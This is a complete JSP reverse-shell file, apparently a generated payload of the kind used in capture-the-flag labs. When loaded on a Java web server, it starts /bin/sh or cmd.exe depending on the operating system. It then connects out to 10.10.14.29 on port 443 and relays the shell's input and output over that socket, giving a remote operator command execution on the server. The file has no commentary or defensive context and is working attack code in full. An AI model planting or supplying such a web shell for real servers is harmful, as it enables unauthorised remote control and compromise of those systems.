<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ox;
    OutputStream vq;

    StreamConnector( InputStream ox, OutputStream vq )
    {
      this.ox = ox;
      this.vq = vq;
    }

    public void run()
    {
      BufferedReader fK  = null;
      BufferedWriter ewG = null;
      try
      {
        fK  = new BufferedReader( new InputStreamReader( this.ox ) );
        ewG = new BufferedWriter( new OutputStreamWriter( this.vq ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = fK.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ewG.write( buffer, 0, length );
          ewG.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( fK != null )
          fK.close();
        if( ewG != null )
          ewG.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.29", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
